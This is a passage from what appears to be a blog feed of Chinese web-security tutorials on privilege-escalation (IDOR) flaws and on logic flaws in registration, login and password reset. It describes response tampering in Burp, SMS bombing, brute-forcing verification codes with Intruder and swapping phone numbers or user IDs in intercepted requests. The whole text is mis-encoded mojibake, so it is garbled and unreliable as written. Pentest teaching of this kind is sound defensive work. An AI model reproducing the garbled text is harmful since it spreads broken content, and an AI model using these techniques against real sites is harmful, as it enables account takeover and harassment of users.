ç›´æŽ¥å¯¹è±¡å¼•ç”¨</p><p>è¿™ç§é€šè¿‡ä¿®æ”¹ä¸€ä¸‹å‚æ•°å°±å¯ä»¥äº§ç”Ÿæ°´å¹³è¶Šæƒï¼Œä¾‹å¦‚æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯é¡µé¢ URL åŽåŠ ä¸Šè‡ªå·±çš„ id ä¾¿å¯æŸ¥çœ‹ï¼Œå½“ä¿®æ”¹ä¸ºä»–äººçš„ ID å·æ—¶ä¼šè¿”å›žä»–äººçš„ä¿¡æ¯ï¼Œä¾¿äº§ç”Ÿäº†æ°´å¹³è¶Šæƒã€‚</p><p>\3. å¤šé˜¶æ®µåŠŸèƒ½</p><p>å¤šé˜¶æ®µåŠŸèƒ½æ˜¯ä¸€ä¸ªåŠŸèƒ½æœ‰å¤šä¸ªé˜¶æ®µçš„å®žçŽ°ã€‚ä¾‹å¦‚ä¿®æ”¹å¯†ç ï¼Œå¯èƒ½ç¬¬ä¸€æ­¥æ˜¯éªŒè¯ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œå·ç éªŒè¯ç ç±»çš„ã€‚å½“éªŒè¯æˆåŠŸåŽï¼Œè·³åˆ°ç¬¬äºŒæ­¥ï¼Œè¾“å…¥æ–°å¯†ç ï¼Œå¾ˆå¤šç¨‹åºä¼šåœ¨è¿™ä¸€æ­¥ä¸å†éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå¯¼è‡´æ¶æ„æ”»å‡»è€…æŠ“åŒ…ç›´æŽ¥ä¿®æ”¹å‚æ•°å€¼ï¼Œå¯¼è‡´å¯ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç ã€‚</p><p>\4. é™æ€æ–‡ä»¶</p><p>å¾ˆå¤šç½‘ç«™çš„ä¸‹è½½åŠŸèƒ½ï¼Œä¸€äº›è¢«ä¸‹è½½çš„é™æ€æ–‡ä»¶ï¼Œä¾‹å¦‚ pdfã€wordã€xls ç­‰ï¼Œå¯èƒ½åªæœ‰ä»˜è´¹ç”¨æˆ·æˆ–ä¼šå‘˜å¯ä¸‹è½½ï¼Œä½†å½“è¿™äº›æ–‡ä»¶çš„ URL åœ°å€æ³„éœ²åŽï¼Œå¯¼è‡´ä»»ä½•äººå¯ä¸‹è½½ï¼Œå¦‚æžœçŸ¥é“ URL å‘½åè§„åˆ™ï¼Œåˆ™ä¼šä¾¿åˆ©æœåŠ¡å™¨çš„æ”¶è´¹æ–‡æ¡£è¿›è¡Œæ‰¹é‡ä¸‹è½½ã€‚</p><p>\5. å¹³å°é…ç½®é”™è¯¯</p><p>ä¸€äº›ç¨‹åºä¼šé€šè¿‡æŽ§ä»¶æ¥é™åˆ¶ç”¨æˆ·çš„è®¿é—®ï¼Œä¾‹å¦‚åŽå°åœ°å€ï¼Œæ™®é€šç”¨æˆ·ä¸å±žäºŽç®¡ç†å‘˜ç»„ï¼Œåˆ™ä¸èƒ½è®¿é—®ã€‚ä½†å½“é…ç½®å¹³å°æˆ–é…ç½®æŽ§ä»¶é”™è¯¯æ—¶ï¼Œå°±ä¼šå‡ºçŽ°è¶Šæƒè®¿é—®ã€‚</p><h3 id="å››ã€å¦‚ä½•æŸ¥æ‰¾è¶Šæƒæ¼æ´ž"><a href="#å››ã€å¦‚ä½•æŸ¥æ‰¾è¶Šæƒæ¼æ´ž" class="headerlink" title="å››ã€å¦‚ä½•æŸ¥æ‰¾è¶Šæƒæ¼æ´ž"></a>å››ã€å¦‚ä½•æŸ¥æ‰¾è¶Šæƒæ¼æ´ž</h3><p>åœ¨ä¸ŽæœåŠ¡å™¨è¿›è¡Œæ•°æ®äº¤äº’æ—¶å®¢æˆ·ç«¯æºå¸¦ç€æ ‡è¯†ç”¨æˆ·çš„èº«ä»½çš„cookieï¼Œå½“æœåŠ¡ç«¯çš„sessionä¸Žcookieä¸­çš„èº«ä»½åŒ¹é…æˆåŠŸåŽï¼Œæ‰èƒ½å…è®¸è¯¥ç”¨æˆ·è¿›è¡Œç›¸å…³æ“ä½œï¼ˆcookieå’Œsessionçš„å…³ç³»â€“&gt;ä¸€å¼¹ã€äºŒå¼¹ï¼‰ã€‚é™¤äº†cookieä¹‹å¤–ï¼Œåœ¨è¯·æ±‚ä¸­å¯èƒ½ä¼šå¸¦ä¸€äº›å‚æ•°ï¼Œç»†è§ˆä¸‹å¯èƒ½å­˜åœ¨è¾¨åˆ«ä¿¡æ¯çš„å”¯ä¸€å€¼ï¼Œæ¥è¿›è¡Œæµ‹è¯•ã€‚è¿™é‡Œè¦è¯´ä¸€ç‚¹ï¼Œä¼ è¾“çš„å‚æ•°å¹¶ä¸ä¸€å®šåœ¨è¯·æ±‚å‚æ•°ä¸­ï¼Œä¹Ÿæœ‰å¯èƒ½å­˜åœ¨URLé“¾æŽ¥çš„ä½ç½®ï¼ˆGETå’ŒPOSTè¯·æ±‚çš„åŒºåˆ«ï¼‰ã€‚å½“æ‹¦æˆªä¸€ä¸ªè¯·æ±‚åŽåˆ†æžæ˜¯å¦æœ‰å‚æ•°ï¼š</p><p>1ã€è¯·æ±‚ä¸­ä¸å­˜åœ¨å‚æ•°ï¼Œåªç”¨cookieè¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ— æ³•æ°´å¹³è¶Šæƒï¼Œå¯èƒ½å‡ºçŽ°åž‚ç›´è¶Šæƒï¼›</p><p>2ã€è¯·æ±‚ä¸­å­˜åœ¨å‚æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¸­çš„æŸäº›å€¼å¯èƒ½æ˜¯è¾¨åˆ«ä¿¡æ¯çš„å”¯ä¸€å€¼ï¼ˆå¦‚employeeIDã€departmentIDã€IDç­‰ï¼‰ï¼Œå¯èƒ½å­˜åœ¨æ°´å¹³å’Œåž‚ç›´è¶Šæƒï¼›è¶Šæƒçš„åŽŸå› æ˜¯å‚æ•°ä¸­çš„employeeIDæ²¡æœ‰åˆ¤æ–­æ˜¯å¦æ˜¯cookieä¸­ç”¨æˆ·æ‰€ç®¡è¾–çš„å‘˜å·¥IDã€‚</p><h3 id="äº”ã€å¦‚ä½•æµ‹è¯•"><a href="#äº”ã€å¦‚ä½•æµ‹è¯•" class="headerlink" title="äº”ã€å¦‚ä½•æµ‹è¯•"></a>äº”ã€å¦‚ä½•æµ‹è¯•</h3><p>å¯¹äºŽæ¸—é€æµ‹è¯•ï¼Œå¯ä»¥å¯¹ä¸€äº›è¯·æ±‚è¿›è¡ŒæŠ“åŒ…æ“ä½œï¼Œæˆ–è€…æŸ¥çœ‹è¯·æ±‚çš„ URL åœ°å€ï¼Œå¯¹äºŽå…³é”®çš„å‚æ•°ä¿®æ”¹ä¸‹å€¼æŸ¥çœ‹ä¸‹è¿”å›žç»“æžœæ¥åˆæ­¥åˆ¤å®šã€‚éšåŽå¯ä»¥æ³¨å†Œä¸¤ä¸ªå°å·ï¼Œç›¸äº’è¾…åŠ©æ¥ç¡®å®šæ˜¯å¦å­˜åœ¨è¶Šæƒã€‚</p><p>å¸¸è§çš„è¶Šæƒé«˜å‘åŠŸèƒ½ç‚¹æœ‰ï¼šæ ¹æ®è®¢å•å·æŸ¥è®¢å•ã€æ ¹æ®ç”¨æˆ· ID æŸ¥çœ‹å¸æˆ·ä¿¡æ¯ã€ä¿®æ”¹ / æ‰¾å›žå¯†ç ç­‰ã€‚</p><p>å¯¹äºŽä»£ç å®¡è®¡ï¼Œå¯ä»¥å…ˆæŸ¥çœ‹å‰ç«¯çš„ç½‘é¡µæºç ï¼ŒæŸ¥çœ‹ä¸€äº›æ“ä½œçš„è¡¨å•æäº¤çš„å€¼ã€‚æŸ¥çœ‹é…ç½®æ–‡ä»¶å’Œä¸€äº›è¿‡æ»¤å™¨ï¼Œçœ‹æ˜¯å¦å¯¹ URL æœ‰ç›¸å…³çš„ç­›é€‰æ“ä½œã€‚æœ€åŽæŸ¥çœ‹åŽå°å¤„ç†é€»è¾‘ï¼Œæ˜¯å¦å­˜åœ¨èº«ä»½éªŒè¯æœºåˆ¶ï¼Œé€»è¾‘æ˜¯å¦å¼‚å¸¸ï¼Œæœ‰æ—¶çš„é€»è¾‘æ¼æ´žä¹Ÿå¯å¯¼è‡´è¶Šæƒæ“ä½œã€‚</p><p>ä¸€èˆ¬æµ‹è¯•æ—¶ï¼Œå¯ä»¥æ³¨å†Œä¸¤ä¸ªå°å·æµ‹è¯•ï¼Œæ›´æ–¹ä¾¿ï¼Œå¤§æ¦‚æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20181026095935634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5YzE0MDEwNzAzMjA=,size_27,color_FFFFFF,t_70" alt="img"></p><h3 id="å…­ã€é˜²èŒƒæŽªæ–½"><a href="#å…­ã€é˜²èŒƒæŽªæ–½" class="headerlink" title="å…­ã€é˜²èŒƒæŽªæ–½"></a>å…­ã€é˜²èŒƒæŽªæ–½</h3><p>1ã€å‰åŽç«¯åŒæ—¶å¯¹ç”¨æˆ·è¾“å…¥ä¿¡æ¯è¿›è¡Œæ ¡éªŒï¼ŒåŒé‡éªŒè¯æœºåˆ¶</p><p>2ã€ æ‰§è¡Œå…³é”®æ“ä½œå‰å¿…é¡»éªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦å…·å¤‡æ“ä½œæ•°æ®çš„æƒé™</p><p>3ã€ç‰¹åˆ«æ•æ„Ÿæ“ä½œå¯ä»¥è®©ç”¨æˆ·å†æ¬¡è¾“å…¥å¯†ç æˆ–å…¶ä»–çš„éªŒè¯ä¿¡æ¯ã€‚</p><p>4ã€å¯ä»¥ä»Žç”¨æˆ·çš„åŠ å¯†è®¤è¯ cookie ä¸­èŽ·å–å½“å‰ç”¨æˆ· idï¼Œé˜²æ­¢æ”»å‡»è€…å¯¹å…¶ä¿®æ”¹ã€‚æˆ–åœ¨ sessionã€cookie ä¸­åŠ å…¥ä¸å¯é¢„æµ‹ã€ä¸å¯çŒœè§£çš„ user ä¿¡æ¯ã€‚</p><p>5ã€ç›´æŽ¥å¯¹è±¡å¼•ç”¨çš„åŠ å¯†èµ„æºIDï¼Œé˜²æ­¢æ”»å‡»è€…æžšä¸¾IDï¼Œæ•æ„Ÿæ•°æ®ç‰¹æ®ŠåŒ–å¤„ç†<img src="https://img-blog.csdnimg.cn/20181026100238142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x5YzE0MDEwNzAzMjA=,size_27,color_FFFFFF,t_70" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:é€»è¾‘æ¼æ´ž</title>
      <link href="2021/05/24/web-luo-ji-lou-dong/"/>
      <url>2021/05/24/web-luo-ji-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="é€»è¾‘æ¼æ´ž"><a href="#é€»è¾‘æ¼æ´ž" class="headerlink" title="é€»è¾‘æ¼æ´ž"></a>é€»è¾‘æ¼æ´ž</h2><p>åœ¨æˆ‘ç†è§£ä¸­ï¼Œé€»è¾‘æ¼æ´žæ˜¯æŒ‡ç”±äºŽç¨‹åºé€»è¾‘è¾“å…¥ç®¡æŽ§ä¸ä¸¥ï¼Œå¯¼è‡´ç¨‹åºä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œä¸€èˆ¬å‡ºçŽ°åœ¨ç™»å½•æ³¨å†Œã€å¯†ç æ‰¾å›žã€ä¿¡æ¯æŸ¥çœ‹ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰ã€‚</p><p><strong>æˆ‘å°†æ‰€æœ‰é€»è¾‘æ¼æ´žçš„é—®é¢˜åˆ†ä¸ºå‰ç«¯å’ŒåŽç«¯ä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ€»ä½“æ€è·¯éƒ½æ˜¯å…ˆæµ‹è¯•å‰ç«¯å†æµ‹è¯•åŽç«¯ã€‚**</strong>åœ¨æˆ‘ç†è§£ä¸­å…¶å®žå°±æ˜¯èƒ½çªç ´è§„åˆ™é™åˆ¶çš„å°±æ˜¯æ¼æ´žã€åƒä¸å¯ä¿®æ”¹çš„é€šè¿‡æŠ“åŒ…å¯ä»¥ä¿®æ”¹äº†ã€‘ã€‚**</p><h3 id="ä¸€ã€æ³¨å†Œå¤„"><a href="#ä¸€ã€æ³¨å†Œå¤„" class="headerlink" title="ä¸€ã€æ³¨å†Œå¤„"></a>ä¸€ã€æ³¨å†Œå¤„</h3><p>æ³¨å†ŒåŠŸèƒ½å¯èƒ½å‡ºçŽ°ä»»æ„ç”¨æˆ·æ³¨å†Œã€çŸ­ä¿¡è½°ç‚¸ç­‰é—®é¢˜ã€‚</p><p>é…åˆæ€ç»´å¯¼å›¾ï¼ˆæ­¤å¤„ä»¥å¸¸è§çš„æ‰‹æœºæ³¨å†Œä¸¾ä¾‹ï¼ŒåŒç†å…¶ä»–æ³¨å†Œä¹Ÿå¯ä»¥å¥—ç”¨è¯¥æ¨¡åž‹ï¼‰ã€‚</p><p><img src="https://image.3001.net/images/20190213/1550027987_5c638cd399b69.png!small" alt="img"></p><p>æ¡†é‡Œé¢æ˜¯å¯¹æ¯ä¸€ä¸ªæ­¥éª¤çš„è§£é‡Šï¼Œæ¡†å³è¾¹æ˜¯æ€»ç»“çš„æµç¨‹ã€‚ï¼ˆå…ˆä¸ç®¡å›¾ç‰‡éªŒè¯ç çš„åŽŸå› æ˜¯å› ä¸ºå°±ç®—å›¾ç‰‡éªŒè¯ç å¯ç»•è¿‡ï¼ŒåŽ‚å•†ä¹Ÿä¼šå› ä¸ºè¯¥æ¼æ´žå±å®³å°è€Œå¿½ç•¥ï¼‰</p><h4 id="1ã€å‰ç«¯"><a href="#1ã€å‰ç«¯" class="headerlink" title="1ã€å‰ç«¯"></a>1ã€å‰ç«¯</h4><p>é¦–å…ˆæ˜¯å‰ç«¯ï¼Œæ‰“å¼€burpsuiteï¼Œå°†æ•´ä¸ªæ³¨å†Œæµç¨‹èµ°ä¸€éï¼Œå°†æ¯ä¸ªæ­¥éª¤çš„åŒ…éƒ½å³é”®æ ‡ä¸Šä¸åŒé¢œè‰²ã€‚</p><p>å°±åƒè¿™æ ·ï¼š</p><p><img src="https://image.3001.net/images/20190213/1550029287_5c6391e7b31f9.png!small" alt="img">æŸ¥çœ‹æ¯ä¸ªè¿”å›žåŒ…æœ‰æ²¡æœ‰è¿”å›žæ‰‹æœºéªŒè¯ç æˆ–è€…å­˜åœ¨trueã€falseä¹‹ç±»çš„åˆ¤æ–­è¯­å¥ï¼Œå°è¯•å°†falseä¿®æ”¹ä¸ºtrueï¼ŒæˆåŠŸæ³¨å†Œçš„è¯å°±ç»•è¿‡äº†å‰ç«¯éªŒè¯ã€‚</p><p>è¿™æ ·å¯ä»¥æ‹¦æˆªè¯¥è¯·æ±‚è¿”å›žåŒ…ï¼š</p><p><img src="https://image.3001.net/images/20190214/1550122177_5c64fcc1a0720.png!small" alt="img"></p><h4 id="2ã€çŸ­ä¿¡è½°ç‚¸"><a href="#2ã€çŸ­ä¿¡è½°ç‚¸" class="headerlink" title="2ã€çŸ­ä¿¡è½°ç‚¸"></a>2ã€çŸ­ä¿¡è½°ç‚¸</h4><p>å°è¯•é‡æ”¾å‘é€éªŒè¯ç çš„åŒ…ï¼ŒæŸ¥çœ‹æ‰‹æœºæ˜¯å¦åœ¨çŸ­æ—¶é—´å†…æ”¶åˆ°äº†å¤šæ¡çŸ­ä¿¡ï¼Œæ˜¯çš„è¯åˆ™å­˜åœ¨çŸ­ä¿¡è½°ç‚¸æ¼æ´žï¼Œè¿™æ˜¯å› ä¸ºåŽç«¯æ²¡æœ‰å¯¹å‘é€æ‰‹æœºçŸ­ä¿¡åšæ—¶é—´é™åˆ¶ã€‚</p><h4 id="3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·"><a href="#3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·" class="headerlink" title="3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·"></a><img src="https://image.3001.net/images/20190213/1550029681_5c6393716d14b.png!small" alt="img">3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·</h4><p>æœ€åŽæ˜¯ä¿®æ”¹å‘é€åŒ…çš„æ‰‹æœºå·ï¼Œé¦–å…ˆç”¨è‡ªå·±çš„æ‰‹æœºæ”¶åˆ°æ­£ç¡®éªŒè¯ç ï¼Œåœ¨ç‚¹å‡»æ³¨å†Œæ—¶æ‹¦æˆªåŒ…å°†æ‰‹æœºå·æ”¹ä¸ºå…¶ä»–æ‰‹æœºå·ï¼Œå¦‚æžœæˆåŠŸçš„è¯å°±æ³¨å†Œäº†åˆ«äººçš„æ‰‹æœºå·ï¼Œè¿™æ˜¯å› ä¸ºåŽç«¯ä»…éªŒè¯äº†éªŒè¯ç æ˜¯å¦æ˜¯æ­£ç¡®çš„è€Œæ²¡æœ‰éªŒè¯éªŒè¯ç æ˜¯å¦ä¸Žæ‰‹æœºåŒ¹é…ã€‚</p><p><img src="https://image.3001.net/images/20190214/1550121679_5c64facf4d378.png!small" alt="img"></p><p>æµç¨‹å°ç»“</p><blockquote><p>1ã€å‰ç«¯åˆ¤æ–­ã€å›žæ˜¾åŠåˆ¤æ–­ã€‘</p><p>2ã€çŸ­ä¿¡è½°ç‚¸</p><p>3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·</p><p>ã€é‚®ç®±æ³¨å†Œã€‘4ã€ä¿®æ”¹å‘é€åŒ…é‚®ç®±å°è¯•è¦†ç›–æ³¨å†Œ</p></blockquote><p>ä»¥ä¸Šæ˜¯æ‰‹æœºæ³¨å†Œçš„å¤§æ¦‚æ¡†æž¶æµç¨‹ï¼ŒåŒç†å…¶ä»–æ³¨å†Œç±»åž‹ä¹Ÿå¯ä»¥å¯¹æ¯”æµ‹è¯•ã€‚</p><h3 id="äºŒã€ç™»å½•å¤„"><a href="#äºŒã€ç™»å½•å¤„" class="headerlink" title="äºŒã€ç™»å½•å¤„"></a>äºŒã€ç™»å½•å¤„</h3><p>ç™»å½•å¤„å¯èƒ½å‡ºçŽ°ä»»æ„ç”¨æˆ·ç™»å½•ã€éªŒè¯ç å¯ç»•è¿‡ã€ç”¨æˆ·è´¦å·å¯æ’žåº“ç­‰é—®é¢˜ã€‚</p><p>é…åˆæ€ç»´å¯¼å›¾ï¼Œæ­¤å¤„æ€ç»´å¯¼å›¾ä¸Šè¯´çš„å¯†ç ä¹Ÿæ˜¯æ‰‹æœºéªŒè¯ç ï¼Œå› ä¸ºæ˜¯ä»¥æ‰‹æœºéªŒè¯ç ç™»å½•ä¸¾ä¾‹ï¼ˆæ­¤å¤„ä»¥å¸¸è§çš„æ‰‹æœºéªŒè¯ç ç™»å½•ä¸¾ä¾‹ï¼ŒåŒæ ·è´¦å·å¯†ç ç™»å½•ä¹Ÿå¯ä»¥å¥—ç”¨è¯¥æ¨¡åž‹ï¼Œæ‰‹æœºéªŒè¯ç ç™»å½•çš„ç‰¹æ®Šå¤„å·²ç”¨æ¡†æ ‡è®°ï¼‰</p><p><img src="https://image.3001.net/images/20190214/1550117645_5c64eb0d7748c.png!small" alt="img">åŒæ ·çš„ï¼Œä¹Ÿæ˜¯å…ˆæµ‹è¯•å‰ç«¯å†æµ‹è¯•åŽç«¯ã€‚</p><h4 id="1ã€å‰ç«¯-1"><a href="#1ã€å‰ç«¯-1" class="headerlink" title="1ã€å‰ç«¯"></a>1ã€å‰ç«¯</h4><p>é¦–å…ˆå¯¹æ¯”æ­£ç¡®ç™»å½•å’Œé”™è¯¯ç™»å½•çš„åŒ…ï¼Œå¯¹æ¯”è¿”å›žåŒ…çœ‹æ˜¯å¦æœ‰åˆ¤æ–­ï¼Œå°è¯•ä¿®æ”¹å‚æ•°ç»•è¿‡å‰ç«¯éªŒè¯ã€‚ï¼ˆè¿™é‡Œä¹Ÿæ˜¯æ‰“å¼€burpsuiteæ•´ä¸ªæµç¨‹èµ°ä¸€éï¼Œå’Œä¸Šé¢çš„æ³¨å†Œå¤„æµ‹è¯•å·®ä¸å¤šï¼‰</p><h4 id="2ã€çŸ­ä¿¡è½°ç‚¸-1"><a href="#2ã€çŸ­ä¿¡è½°ç‚¸-1" class="headerlink" title="2ã€çŸ­ä¿¡è½°ç‚¸"></a>2ã€çŸ­ä¿¡è½°ç‚¸</h4><p>æµ‹è¯•çŸ­ä¿¡è½°ç‚¸ä¸Žæ³¨å†Œå¤„æµ‹è¯•æ­¥éª¤ä¸€æ ·ï¼ˆä¸€èˆ¬æ¥è¯´æ³¨å†Œå¤„æœ‰çŸ­ä¿¡è½°ç‚¸çš„è¯è¿™é‡Œä¹Ÿä¼šæœ‰ï¼‰ã€‚</p><h4 id="3ã€éªŒè¯ç çˆ†ç ´"><a href="#3ã€éªŒè¯ç çˆ†ç ´" class="headerlink" title="3ã€éªŒè¯ç çˆ†ç ´"></a>3ã€éªŒè¯ç çˆ†ç ´</h4><p>å†ç„¶åŽå°±æ˜¯éªŒè¯ç çˆ†ç ´ï¼ˆæˆ–ç»•è¿‡ï¼‰ï¼Œæ­¤å¤„éªŒè¯ç åŒ…æ‹¬å›¾ç‰‡éªŒè¯ç å’Œæ‰‹æœºéªŒè¯ç ï¼Œå…ˆæµ‹è¯•å›¾ç‰‡éªŒè¯ç ï¼Œå°†ä½¿ç”¨æ­£ç¡®å¯†ç ç™»å½•çš„åŒ…å†é‡æ”¾ä¸€æ¬¡ï¼Œå¦‚æžœå›žæ˜¾è¿˜æ˜¯æ­£ç¡®ç™»å½•çš„è¯è¯´æ˜Žå¹¶æ²¡æœ‰å¯¹å›¾ç‰‡éªŒè¯ç è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥å°è¯•æ’žåº“ã€‚</p><p>è‡³äºŽæ‰‹æœºéªŒè¯ç ï¼Œé€šå¸¸æ˜¯å°è¯•çˆ†ç ´ï¼Œå¦‚æžœç½‘ç«™å‘åˆ°æ‰‹æœºä¸Šçš„çŸ­ä¿¡æ²¡æœ‰å†™ä»€ä¹ˆåœ¨xxæ—¶é—´å†…æœ‰æ•ˆä¹‹ç±»çš„åˆ™æœ‰å¯èƒ½æ²¡æœ‰æ—¶é—´é™åˆ¶ï¼Œå°†ç™»å½•åŒ…å³é”®å‘é€è‡³Intruderï¼ˆå³æµ‹è¯•å™¨æ¨¡å—ï¼‰è®¾ç½®å¥½çˆ†ç ´ä½ç½®åŽåœ¨è½½è·é‡Œé€‰æ‹©æ•°å€¼åŽè¿™æ ·å¡«å†™ã€‚</p><p><img src="https://image.3001.net/images/20190214/1550120969_5c64f8098cf06.png!small" alt="img">é€šå¸¸èŒƒå›´æ˜¯å¡«å†™æ­£ç¡®éªŒè¯ç æ‰€åœ¨çš„èŒƒå›´ï¼Œçˆ†ç ´å‡ºæ¥å¯ä»¥ç™»å½•ç”¨æˆ·ï¼Œæ¼æ´žæ ‡é¢˜ä¹Ÿå°±å¯ä»¥å†™ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´žã€‚</p><h4 id="4ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·"><a href="#4ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·" class="headerlink" title="4ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·"></a>4ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·</h4><p>ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·åˆ™å’Œä¸Šé¢æ³¨å†Œå¤„ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·æ­¥éª¤ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ä¸Šé¢æ³¨å†Œå¤„æ˜¯ä¸ºäº†æµ‹è¯•ä»»æ„ç”¨æˆ·æ³¨å†Œï¼Œè€Œè¿™é‡Œç™»å½•å¤„æ˜¯ä¸ºäº†æµ‹è¯•ä»»æ„ç”¨æˆ·ç™»å½•ï¼ŒåŽŸç†ä¸€æ ·ç›®çš„ä¸åŒã€‚</p><h4 id="5ã€ä¿®æ”¹ç”¨æˆ·å‚æ•°"><a href="#5ã€ä¿®æ”¹ç”¨æˆ·å‚æ•°" class="headerlink" title="5ã€ä¿®æ”¹ç”¨æˆ·å‚æ•°"></a>5ã€ä¿®æ”¹ç”¨æˆ·å‚æ•°</h4><p>æŸ¥çœ‹æ­£ç¡®ç™»å½•åŒ…çš„è¿”å›žåŒ…æ˜¯å¦æœ‰ç”¨æˆ·idä¹‹ç±»çš„å‚æ•°ï¼Œå°è¯•ä¿®æ”¹è¯¥å‚æ•°ã€‚ï¼ˆä¸å«Œéº»çƒ¦çš„è¯å¯ä»¥ç”¨ä¸¤ä¸ªæ­£ç¡®ç™»å½•çš„è¿”å›žåŒ…å¯¹æ¯”ï¼‰</p><p>æ‹¦æˆªè¯¥è¯·æ±‚çš„è¿”å›žåŒ…ä¿®æ”¹è¿”å›žåŒ…ä¸­çš„ç”¨æˆ·å‚æ•°ã€‚</p><p>æµç¨‹å°ç»“</p><blockquote><p>1ã€å‰ç«¯åˆ¤æ–­ã€å›žæ˜¾åŠåˆ¤æ–­ã€‘</p><p>2ã€çŸ­ä¿¡è½°ç‚¸</p><p>3ã€éªŒè¯ç çˆ†ç ´</p><p>4ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·</p><p>5ã€å°è¯•ä¿®æ”¹ç”¨æˆ·å‚æ•°ã€æ³¨æ„tokenç­‰å‚æ•°ã€‘</p></blockquote><h3 id="ä¸‰ã€å¯†ç æ‰¾å›žå¤„"><a href="#ä¸‰ã€å¯†ç æ‰¾å›žå¤„" class="headerlink" title="ä¸‰ã€å¯†ç æ‰¾å›žå¤„"></a>ä¸‰ã€å¯†ç æ‰¾å›žå¤„</h3><p>å¯†ç æ‰¾å›žå¤„å¯èƒ½å‡ºçŽ°ä»»æ„ç”¨æˆ·å¯†ç æ‰¾å›žã€éªŒè¯ç å¯ç»•è¿‡ç­‰é—®é¢˜ã€‚</p><p>å¯†ç æ‰¾å›žå¤„çš„æ€ç»´å¯¼å›¾ï¼Œæ­¤å¤„ä»¥æ‰‹æœºéªŒè¯ç æ‰¾å›žä¸ºä¾‹ã€‚</p><p><img src="https://image.3001.net/images/20190215/1550198850_5c6628422d72a.png!small" alt="img">è¿™é‡Œä¹Ÿæ˜¯å…ˆå‰ç«¯å†åŽç«¯ã€‚</p><h4 id="1ã€å‰ç«¯-2"><a href="#1ã€å‰ç«¯-2" class="headerlink" title="1ã€å‰ç«¯"></a>1ã€å‰ç«¯</h4><p>å‰ç«¯æµ‹è¯•ä¸Žå‰é¢ä¸€è‡´ï¼Œæ— éžå°±æ˜¯ä¿®æ”¹è¿”å›žåŒ…çœ‹æ˜¯å¦èƒ½è·³è¿‡éªŒè¯æ­¥éª¤ï¼Œæ­¤å¤„ä¹Ÿå°±ç•¥è¿‡ã€‚</p><h4 id="2ã€éªŒè¯ç çˆ†ç ´"><a href="#2ã€éªŒè¯ç çˆ†ç ´" class="headerlink" title="2ã€éªŒè¯ç çˆ†ç ´"></a>2ã€éªŒè¯ç çˆ†ç ´</h4><p>ç¬¬2æ­¥ä¹‹æ‰€ä»¥æ²¡æœ‰å†™çŸ­ä¿¡è½°ç‚¸æ˜¯å› ä¸ºå‰é¢æ³¨å†Œå’Œç™»å½•å·²ç»æµ‹è¯•è¿‡äº†ã€‚</p><p>éªŒè¯ç çˆ†ç ´ä¸Žä¸Šé¢ç™»å½•å¤„çš„éªŒè¯ç çˆ†ç ´æ“ä½œä¸€è‡´ã€‚</p><h4 id="3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·-1"><a href="#3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·-1" class="headerlink" title="3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·"></a>3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·</h4><p>è¿™é‡Œä¸Žä¸Šé¢æ³¨å†Œå¤„çš„ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·æ“ä½œä¸€è‡´ï¼Œä¹Ÿå°±ä¸å¤šè¯´äº†ã€‚</p><p>æµç¨‹å°ç»“ï¼ˆå…¶å®žç²¾åŽéƒ½åœ¨æ€ç»´å¯¼å›¾ä¸Šï¼Œå…¶ä»–çš„éƒ½æ˜¯åšè§£é‡Šï¼Œåœ¨æœ€åŽæˆ‘ä¼šæŠŠæ€ç»´å¯¼å›¾æ•´ä½“æ”¾ä¸Šæ¥ï¼‰</p><blockquote><p>1ã€å‰ç«¯åˆ¤æ–­ã€å›žæ˜¾åŠåˆ¤æ–­ã€‘</p><p>2ã€éªŒè¯ç çˆ†ç ´</p><p>3ã€ä¿®æ”¹å‘é€åŒ…æ‰‹æœºå·æˆ–é‚®ç®±ã€æäº¤æ—¶ä¿®æ”¹æ‰‹æœºå·æˆ–è€…ä¿®æ”¹éªŒè¯ç å‘é€åŒ…çš„æ‰‹æœºå·ã€‘</p><p>4ã€ã€é‚®ç®±æ‰¾å›žã€‘é“¾æŽ¥å°è¯•ä¿®æ”¹ç”¨æˆ·å‚æ•°ã€æ³¨æ„tokenç­‰å‚æ•°ã€‘</p></blockquote><h3 id="å››ã€æ”¯ä»˜ä¸Žè¶Šæƒ"><a href="#å››ã€æ”¯ä»˜ä¸Žè¶Šæƒ" class="headerlink" 